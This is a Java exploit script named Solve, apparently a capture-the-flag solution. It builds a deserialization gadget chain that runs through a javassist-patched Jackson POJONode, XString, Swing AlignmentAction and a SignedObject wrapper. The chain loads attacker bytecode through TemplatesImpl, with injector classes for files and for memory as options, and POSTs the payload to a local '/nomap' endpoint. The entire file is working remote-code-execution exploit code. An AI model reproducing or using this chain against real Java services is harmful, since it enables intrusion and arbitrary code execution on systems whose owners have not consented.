import com.fasterxml.jackson.databind.node.POJONode;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xpath.internal.objects.XString;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import org.springframework.http.HttpEntity;
import org.springframework.http.ResponseEntity;
import org.springframework.web.client.RestTemplate;

import javax.swing.*;
import javax.swing.event.SwingPropertyChangeSupport;
import javax.swing.text.StyledEditorKit;
import java.io.*;
import java.lang.reflect.Field;
import java.net.URI;
import java.security.SignedObject;

public class Solve {

    static {
        try {
            // javassist 修改 BaseJsonNode
            ClassPool classPool = ClassPool.getDefault();
            CtClass ctClass = classPool.getCtClass("com.fasterxml.jackson.databind.node.BaseJsonNode");
            CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
            writeReplace.setBody("return $0;");
            ctClass.writeFile();
            ctClass.toClass();
        } catch (Exception e){
            e.printStackTrace();
        }
    }

    public static void main(String[] args) throws Exception{

        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_bytecodes",
                new byte[][]{ClassPool.getDefault().get(FileInject.class.getName()).toBytecode()}
//                new byte[][]{ClassPool.getDefault().get(VMInject.class.getName()).toBytecode()}
//                new byte[][]{ClassPool.getDefault().get(MemController.class.getName()).toBytecode()}
        );
        setFieldValue(templates, "_name", "name");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

        POJONode pojoNode = new POJONode("");
        XString xstr = new XString("");

        StyledEditorKit.AlignmentAction action = Reflections.createWithoutConstructor(StyledEditorKit.AlignmentAction.class);
        setFieldValue(action, "changeSupport", new SwingPropertyChangeSupport(""));

        action.putValue("r1", "");
        action.putValue("r2", "");
        Field tablefield = AbstractAction.class.getDeclaredField("arrayTable");
        tablefield.setAccessible(true);
        Object atable = tablefield.get(action);
        Field tablefield1 = atable.getClass().getDeclaredField("table");
        tablefield1.setAccessible(true);
        Object[] table1 = (Object[])tablefield1.get(atable);
        table1[1] = xstr;
        table1[3] = pojoNode;
        tablefield1.set(atable, table1);
        setFieldValue(pojoNode, "_value", templates);

        ByteArrayOutputStream barr1 = new ByteArrayOutputStream();
        ObjectOutputStream oos1 = new ObjectOutputStream(barr1);
        oos1.writeObject(action);

        Object signedObject = Reflections.createWithoutConstructor(SignedObject.class);
        setFieldValue(signedObject, "content", barr1.toByteArray());
        setFieldValue(signedObject, "signature", "Ricky".getBytes());
        setFieldValue(signedObject, "thealgorithm", null);

        table1[1] = xstr;
        table1[3] = pojoNode;
        tablefield1.set(atable, table1);
        setFieldValue(pojoNode, "_value", signedObject);

        ByteArrayOutputStream barr2 = new ByteArrayOutputStream();
        ObjectOutputStream oos2 = new ObjectOutputStream(barr2);
        oos2.writeUTF("NEEPU");
        oos2.writeInt(1949);
        oos2.writeObject(action);

        doPOST(barr2.toByteArray());
    }

    public static void doPOST(byte[] obj) throws Exception {
        URI url = new URI("http://127.0.0.1:8090/nomap");
        HttpEntity<byte[]> requestEntity = new HttpEntity<>(obj);
        RestTemplate restTemplate = new RestTemplate();
        ResponseEntity<String> res = restTemplate.postForEntity(url, requestEntity, String.class);
        System.out.println(res.getBody());
    }

    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        }
        catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }
}
